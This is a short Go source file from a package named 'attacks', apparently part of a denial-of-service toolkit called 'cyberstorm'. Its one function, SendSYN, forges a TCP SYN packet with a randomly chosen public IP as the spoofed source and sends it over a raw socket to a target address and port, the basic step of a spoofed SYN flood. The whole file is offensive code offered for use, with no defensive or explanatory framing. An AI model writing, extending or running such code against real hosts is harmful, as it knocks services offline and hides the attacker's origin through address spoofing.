package attacks

import (
	"net"
	"syscall"

	"cyberstorm/core"
)

func SendSYN(rawSocket core.RawSocket, dstIp net.IP, dstPort uint16) error {
	srcIp := core.GetRandPublicIP()
	tcpHeaderBytes, err := core.GetTCPSYNHeaderBytes(srcIp, dstIp, dstPort)
	if err != nil {
		return err
	}

	return core.SendPacket(rawSocket, srcIp, dstIp, syscall.IPPROTO_TCP, tcpHeaderBytes)
}
